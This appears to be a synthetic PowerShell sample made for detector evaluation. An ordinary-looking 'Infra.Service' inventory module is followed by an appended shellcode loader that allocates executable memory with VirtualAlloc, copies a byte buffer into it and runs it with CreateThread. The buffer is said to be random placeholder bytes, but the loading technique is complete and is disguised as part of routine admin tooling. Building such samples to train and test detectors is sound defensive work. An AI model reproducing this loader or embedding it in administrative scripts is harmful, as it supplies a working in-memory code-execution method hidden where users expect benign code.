
$InformationPreference = 'SilentlyContinue'
$script:DefaultTimeout = 30
$script:ModuleVersion = '2.5.2'

function Get-InfraService {
    <#
    .SYNOPSIS
        Returns Infra inventory records.
    .DESCRIPTION
        Returns data for the requested objects.
    .PARAMETER Name
        One or more object names.
    .PARAMETER Environment
        Target environment.
    #>
    [CmdletBinding()]
    [OutputType([pscustomobject])]
    param(
        [Parameter(ValueFromPipeline = $true, Mandatory = $true)]
        [string[]]$Name,

        [ValidateSet('Dev', 'Test', 'Prod')]
        [string]$Environment = 'Prod'
    )

    begin {
        $results = [System.Collections.Generic.List[object]]::new()
    }

    process {
        foreach ($item in $Name) {
            $results.Add([pscustomobject]@{
                Name        = $item
                Environment = $Environment
                QueriedAt   = Get-Date
            })
        }
    }

    end {
        $results
    }
}

function Set-InfraServiceTag {
    <#
    .SYNOPSIS
        Applies a tag to an existing object.
    .PARAMETER Name
        Object to tag.
    .PARAMETER Tag
        Tag value.
    #>
    [CmdletBinding(SupportsShouldProcess = $true)]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name,

        [Parameter(Mandatory = $true)]
        [string]$Tag
    )

    if ($PSCmdlet.ShouldProcess($Name, 'Apply tag')) {
        Write-Verbose ("Tagging {0} with {1}" -f $Name, $Tag)
        [pscustomobject]@{ Name = $Name; Tag = $Tag; UpdatedAt = Get-Date }
    }
}
function Test-InfraServiceHealth {
    <#
    .SYNOPSIS
        Tests whether an object answers on its management port.
    .PARAMETER Name
        Object to probe.
    .PARAMETER Port
        TCP port to probe.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name,

        [int]$Port = 5985
    )

    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $async = $client.BeginConnect($Name, $Port, $null, $null)
        $connected = $async.AsyncWaitHandle.WaitOne(2000)
        return ($connected -and $client.Connected)
    }
    catch {
        return $false
    }
    finally {
        $client.Close()
    }
}

function Resolve-InfraPath {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Path
    )

    if ([string]::IsNullOrWhiteSpace($Path)) {
        throw 'Path must not be empty.'
    }
    return [System.IO.Path]::GetFullPath($Path)
}
function Infra-Cache {
    [CmdletBinding()]
    param([string]$Key, [object]$Value)

    if (-not $script:Cache) {
        $script:Cache = @{}
    }
    if ($PSBoundParameters.ContainsKey('Value')) {
        $script:Cache[$Key] = $Value
    }
    return $script:Cache[$Key]
}

function Get-InfraModuleInfo {
    [CmdletBinding()]
    param()

    [pscustomobject]@{
        Module      = 'Infra.Service'
        Version     = $script:ModuleVersion
        Timeout     = $script:DefaultTimeout
        Exported    = @('Get-InfraService', 'Set-InfraServiceTag', 'Test-InfraServiceHealth')
    }
}

$script:ExportedFunctions = @('Get-InfraService', 'Set-InfraServiceTag', 'Test-InfraServiceHealth')
Write-Verbose ('Exporting {0} functions' -f $script:ExportedFunctions.Count)

Write-Verbose ('Loaded module {0} version {1}' -f 'Infra.Service', $script:ModuleVersion)

$script:Cache = @{}
Write-Verbose ('Cache initialised for {0}' -f 'Infra.Service')

$script:ModuleRoot = if ($PSScriptRoot) { $PSScriptRoot } else { (Get-Location).Path }
Write-Verbose ('Module root: {0}' -f $script:ModuleRoot)

if ($ExecutionContext.SessionState.Module) {
    Write-Verbose 'Module session detected.'
}
else {
    Write-Verbose 'Script session detected.'
}

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

Export-ModuleMember -Function Get-InfraService, Set-InfraServiceTag, Test-InfraServiceHealth, Get-InfraModuleInfo
<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class NativeMethods
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0xa0, 0x33, 0xb2, 0x93, 0x5d, 0xa5, 0x48, 0xe2, 0x99, 0xc5, 0xdc, 0x4c, 0x90, 0x09, 0x21, 0xf0,
        0x46, 0x4a, 0x26, 0xb8, 0x9a, 0xaf, 0xd6, 0xf0, 0xc1, 0xd3, 0x76, 0x9b, 0x29, 0x59, 0x9f, 0xa6,
        0x32, 0xec, 0x5e, 0x3e, 0xbe, 0xee, 0x3e, 0x87, 0x4b, 0xbc, 0x7f, 0xe0, 0xcd, 0x55, 0x96, 0xd1,
        0x4e, 0x05, 0xcf, 0xb1, 0xb9, 0x12, 0x55, 0x49, 0xf5, 0x7b, 0x63, 0x05, 0xca, 0x4d, 0x93, 0xf6,
        0xe4, 0x16, 0x30, 0x57, 0xbc, 0xc2, 0x61, 0xf4, 0x0a, 0xde, 0x2f, 0xac, 0x30, 0xa7, 0x70, 0x2b,
        0xbc, 0x56, 0xb4, 0x95, 0x07, 0x54, 0xa9, 0x87, 0xbe, 0x30, 0xd1, 0x79, 0x06, 0x21, 0x59, 0xb7,
        0xe6, 0x66, 0xfa, 0x74, 0x0b, 0x3b, 0x25, 0xf6, 0x68, 0x62, 0xac, 0x14, 0x67, 0x30, 0x70, 0xbe,
        0x78, 0xba, 0x17, 0x6d, 0xf9, 0x8d, 0xbc, 0xfe, 0x61, 0x35, 0xda, 0x88, 0x9b, 0xda, 0x5b, 0x74,
        0x81, 0xb0, 0x15, 0x9c, 0x91, 0x4c, 0xa1, 0xf8, 0x9d, 0x28, 0x5f, 0xbc, 0xfe, 0x16, 0xab, 0xc0,
        0x86, 0x66, 0x17, 0x31, 0x11, 0xce, 0xd7, 0x6d, 0xd8, 0x5f, 0xd2, 0xc2, 0x71, 0x08, 0x53, 0x60,
        0x11, 0x05, 0x7c, 0xce, 0xa9, 0x91, 0x71, 0xf4, 0xc8, 0x87, 0x9f, 0x0e, 0xb4, 0x91, 0x48, 0x24,
        0x85, 0x46, 0x3f, 0xc8, 0x1f, 0x84, 0x16, 0x54, 0x92, 0x62, 0xac, 0x1b, 0x40, 0x53, 0x01, 0x36,
        0x2e, 0x30, 0xcd, 0xc8, 0x2f, 0xa4, 0xb2, 0x81, 0x3b, 0x41, 0x84, 0xca, 0xe6, 0x9c, 0x8c, 0xc9,
        0x75, 0x21, 0xc1, 0x56, 0xca, 0x5f, 0x5f, 0xd6, 0x94, 0x55, 0x50, 0xaf, 0xac, 0xcd, 0xc9, 0x15,
        0x3f, 0xa9, 0xbb, 0x0d, 0xe1, 0xda, 0x2c, 0x7d, 0x1e, 0xd9, 0xc9, 0x7e, 0x54, 0x75, 0x06, 0x9b,
        0x61
    )

    $BufferAddress = [NativeMethods]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($BufferAddress -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $BufferAddress, $Buffer.Length)
    $ThreadId = 0
    $Thread = [NativeMethods]::CreateThread([IntPtr]::Zero, 0, $BufferAddress, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][NativeMethods]::WaitForSingleObject($Thread, 2606)
    [void][NativeMethods]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
